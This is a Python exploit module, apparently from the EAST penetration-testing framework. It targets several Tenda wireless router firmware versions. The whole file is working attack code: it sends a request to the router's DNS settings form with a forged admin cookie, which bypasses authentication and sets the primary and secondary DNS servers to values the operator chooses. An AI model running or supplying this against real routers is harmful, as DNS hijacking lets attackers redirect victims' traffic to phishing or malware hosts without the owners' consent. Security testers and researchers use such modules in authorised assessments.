#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import urllib2

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_tenda_routers_dns_change"
INFO['DESCRIPTION'] = "Tenda Wireless Routers - Unauthenticated DNS Change"
INFO['VENDOR'] = "http://www.tendacn.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/44377/', 'https://www.exploit-db.com/exploits/44380/', 'https://www.exploit-db.com/exploits/44381/']
INFO["CVE Name"] = ""
INFO["NOTES"] = """Tenda W316R Wireless Router 5.07.50, Tenda W3002R/A302/w309r Wireless Router V5.07.64_en, Tenda FH303/A300 Firmware V5.07.68_EN are subject to unauthenticated DNS change
"""
INFO['CHANGELOG'] = "02 Apr, 2018. Written by Gleg team."
INFO['PATH'] = 'Exploits/Hardware/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "192.168.1.1", dict(description = 'Target IP')
OPTIONS["DNS1"] = '8.8.8.8', dict(description = 'Primary DNS')
OPTIONS["DNS2"] = '8.8.4.4', dict(description = 'Secondary DNS')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.dns1 = ''
        self.dns2 = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.dns1 = self.args.get('DNS1', self.dns1)
        self.dns2 = self.args.get('DNS2', self.dns2)
    
    def run(self):
        self.args()
        self.log("")
        
        self.log('Try to set DNS adresses to {} {}'.format(self.dns1, self.dns2))
        url = 'http://{}/goform/AdvSetDns?GO=wan_dns.asp&rebootTag=&DSEN=1&DNSEN=on&DS1={}&DS2={}'.format(self.host, self.dns1, self.dns2)

        try:
            request = urllib2.Request(url)
            request.add_header('Cookie', 'admin:language=en; path=/')
            urllib2.urlopen(request)
        except Exception as e:
            self.log(e)
            self.finish(False)
        
        self.log('DNS was changed')
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
